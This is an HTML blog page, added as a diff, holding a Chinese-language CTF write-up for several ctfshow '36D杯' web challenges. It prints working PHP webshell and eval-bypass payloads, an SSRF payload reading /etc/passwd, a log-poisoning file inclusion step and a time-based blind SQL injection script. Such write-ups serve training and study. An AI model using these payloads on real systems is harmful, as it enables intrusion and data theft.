@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Peguin">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="ctfshow"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="敢于去想，才会有MEteor的光芒闪耀。" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Hexo"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>ctfshow - Hexo</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Google Analytics -->
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2020/05/05/ctfshow/">
+                ctfshow
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-05-05</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="36D杯"><a href="#36D杯" class="headerlink" title="36D杯"></a>36D杯</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="0X01-你取吧"><a href="#0X01-你取吧" class="headerlink" title="0X01:你取吧"></a>0X01:你取吧</h4><p>打开题目，给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有两种解法，分别是Ying师傅和HA1C9ON师傅的，下面来尝试一下</p>
+<p>1.之前为了做红包题看过一篇p牛的无数字无字母RCE，只不过当时没想到可以这样做，下面是p牛的写的webshell，直接打就行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="string">" "</span>);</span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]);<span class="comment">// // ASSERT($_POST[_]);</span></span><br><span class="line"><span class="comment">//再post提交_=system("cat /flag");</span></span><br></pre></td></tr></table></figure>
+
+<p>2.根据代码的意思，用${$<em>{7}.$</em>{8}.$<em>{12}.$</em>{19}}可以拼凑出$hint，这样就能顺利以base64的方式读取hhh.php文件了，解密得到是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"/phpjiami.zip\n/hint.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下载压缩包，解密源码，得到一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.rt.e.saucerman"</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>POST</p>
+<p><strong>6=system(‘cat /flag’);</strong>就可以拿到flag</p>
+<img src="/2020/05/05/ctfshow/%E4%BD%A0%E6%8B%BF%E5%90%A7.png" class="" title="examplename">
+
+<h4 id="0X02：RemoteImageDownloader"><a href="#0X02：RemoteImageDownloader" class="headerlink" title="0X02：RemoteImageDownloader"></a>0X02：RemoteImageDownloader</h4><p>打开题目，给了一个http？？？？，可能是ssrf注入，测试一下发现下载了一张截图图片</p>
+<p>vps监听</p>
+<img src="/2020/05/05/ctfshow/RemoteImageDownloader.png" class="" title="examplename">
+
+<p>根据提示，去找资料，有文章<a href="https://www.anquanke.com/post/id/86371，里面有poc" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86371，里面有poc</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在自己的vpsweb服务目录下起个网页，再把目标改为flag</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heaed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">x = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="actionscript">x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="actionscript">x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>);</span></span><br><span class="line">x.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在网页直接读取下载这个文件，成功拿到flag</p>
+<img src="/2020/05/05/ctfshow/RemoteImageDownloader1.png" class="" title="examplename">
+
+
+
+<h4 id="0X03：给你shell"><a href="#0X03：给你shell" class="headerlink" title="0X03：给你shell"></a>0X03：给你shell</h4><p>在网页源码处找到了跳转页面，跳转</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">':'</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">'&#123;"secret"'</span> &amp;&amp; preg_match(<span class="string">'/^[\"0-9A-Z]*&#125;$/'</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">'secret'</span>, <span class="string">''</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span><span class="params">($_f_g)</span> </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'secret'</span>]) ? $json = $_COOKIE[<span class="string">'secret'</span>] : setcookie(<span class="string">'secret'</span>, <span class="string">'&#123;"secret":"'</span> . strtoupper(md5(<span class="string">'y1ng'</span>)) . <span class="string">'"&#125;'</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="keyword">true</span>) : <span class="keyword">die</span>(<span class="string">'no'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'give_me_shell'</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">"here is your webshell: $shell_path"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑：</p>
+<ul>
+<li>cookie，存的是json</li>
+<li>checkCookie()函数检测json数据只有一对键值对</li>
+<li>secret!=$flag_md5，调用havefun函数，否则就输出shell地址</li>
+</ul>
+<p>经过测试，数字&amp;0xC0都为0，字母&amp;0xC0都是64，flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc，刚好是000打头，弱类型直接上burp爆破</p>
+<img src="/2020/05/05/ctfshow/shell1.png" class="" title="examplename">
+
+<p>根据提示，到下一步</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hidden_filter.php"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;location.href=\'./index.php\'&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//清空session 从头再来</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"\$_SESSION["</span> . $code . <span class="string">"]=false;"</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面就是看Ying师傅的wp做了，fuzz黑名单过滤了一下东西</p>
+<ul>
+<li>f、sys、include</li>
+<li>括号、引号、分号</li>
+<li>^ &amp;等运算符</li>
+<li>空格 / \ $ ` * #等符号</li>
+</ul>
+<p>这里带括号的函数，空格，分号都不能使用，命令拼接也无效</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br><span class="line">&#x2F;&#x2F;用?&gt;&lt;?来bypass分号</span><br><span class="line">&#x2F;&#x2F;PHP黑魔法 require和取反运算符之间不需要空格照样执行</span><br><span class="line">&#x2F;&#x2F;没有括号 使用那些不需要括号的函数 这里使用require</span><br><span class="line">&#x2F;&#x2F;]&#x3D;1来闭合session</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/05/ctfshow/shell2.png" class="" title="examplename">
+
+<p>拿到flag</p>
+<h4 id="0X04：WEB-ALL-INFO-U-WANT"><a href="#0X04：WEB-ALL-INFO-U-WANT" class="headerlink" title="0X04：WEB_ALL_INFO_U_WANT"></a>0X04：WEB_ALL_INFO_U_WANT</h4><img src="/2020/05/05/ctfshow/want1.png" class="" title="examplename">
+
+<p>看到提示，用扫描器扫到index.php.bak,下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line">&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;give you all information you want</span><br><span class="line">if (isset($_GET[&#39;all_info_i_want&#39;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];</span><br><span class="line">    &#x2F;&#x2F;really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">really really really baby challenge right?</span><br></pre></td></tr></table></figure>
+
+<p>http回包header得知是nginx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">&#x2F;&#x2F;在user-agent处写入一句话木马即可包含RCE</span><br></pre></td></tr></table></figure>
+
+<h4 id="0X05：WEB-Login-Only-For-36D"><a href="#0X05：WEB-Login-Only-For-36D" class="headerlink" title="0X05：WEB_Login_Only_For_36D"></a>0X05：WEB_Login_Only_For_36D</h4><p>打开是个注入题，常规手段fuzz一下，发现过滤了一下东西</p>
+<ul>
+<li>单引号</li>
+<li>select substr等很多关键字</li>
+<li>= &gt; &lt;</li>
+<li>空格 – ; |等符号</li>
+</ul>
+<p>发现源码有提示</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- if (!preg_match('/admin/', $uname)) die; --&gt;</span><br><span class="line">&lt;!-- select * from 36d_user where username='$uname' and password='$passwd'; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>admin\</code>把单引号注释掉让后面<code>$passwd</code>逃逸出去</p>
+<p>布尔盲注无回显，用时间盲注，上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += hex(ord(i))</span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + result</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"https://dc695489-cf68-45f2-97f9-1a21f62ba9e3.chall.ctf.show/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'IABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        password = ord2hex(res + chr(j))</span><br><span class="line">        password = <span class="string">'or/**/if((password/**/REGEXP/**/binary/**/&#123;&#125;),sleep(10),1)#'</span>.format(password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"admin\\"</span>,</span><br><span class="line">            <span class="string">'password'</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        r = req.post(url=url, data=data)</span><br><span class="line">        endtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> endtime - startTime &gt; <span class="number">5</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>跑出来密码是ILoVeThlrtySixD，跑了好几次才跑出来正确的</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/show/">#show</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo" target="_blank" rel="noopener">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2020/05/05/ctfshow/">ctfshow</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/04/29/XMCTF/">XMCTF</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2020/03/29/BJD2MRCTF/">BJD2MRCTF</a>
+            </li>
+            
+            <li>
